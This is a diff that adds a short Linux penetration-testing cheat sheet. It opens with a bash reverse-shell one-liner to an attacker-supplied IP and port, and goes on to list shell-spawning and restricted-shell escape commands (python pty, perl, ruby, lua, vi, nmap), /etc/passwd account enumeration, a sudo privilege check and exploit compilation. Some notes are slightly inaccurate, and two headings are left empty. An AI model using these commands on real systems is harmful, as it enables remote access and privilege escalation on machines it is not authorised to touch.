@@ -1,0 +1,52 @@
+LINUX
+Spawn a dirty bash reverse shell
+bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
+
+If LS is disabled
+echo /usr/local/rbin/*
+
+Compiling for other kernels:
+gcc -m32 -Wl,--hash-style=both exploitname.c -o exploit
+
+Checking your logs
+tail -f /path/to/logs (/var/log/apache2/acccess.log)
+
+http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+
+Searching for accounts that have login privs, via etc/passwd
+grep -vE "nologin|false" /etc/passwd
+
+Check if you can become su
+sudo -l (can add -U <username> to see if another user can do it also)
+
+Spawning Shells (run env first to see what is actually going on)
+
+python -c 'import pty; pty.spawn("/bin/sh")' 
+ echo os.system('/bin/bash') 
+ /bin/sh -i 
+ perl —e 'exec "/bin/sh";' 
+ perl: exec "/bin/sh"; 
+ ruby: exec "/bin/sh" 
+ lua: os.execute('/bin/sh') 
+(From within IRB) exec "/bin/sh" 
+(From within vi) :!bash 
+(From within vi) :set shell=/bin/bash:shell 
+(From within nmap) !sh
+
+Unzipping tarballs
+
+tar xvpf <file name>
+z = unzip
+x = extract files from archive
+v = print verbosely
+f = the next argument in the command is the filename
+
+Copy and rename file at same time
+
+cp /path/to/file/filenameA.exe /path/to/file/filenameB.exe (copies and renames in one command)
+
+Structure of Shadow File
+
+
+File Permissions
+ 
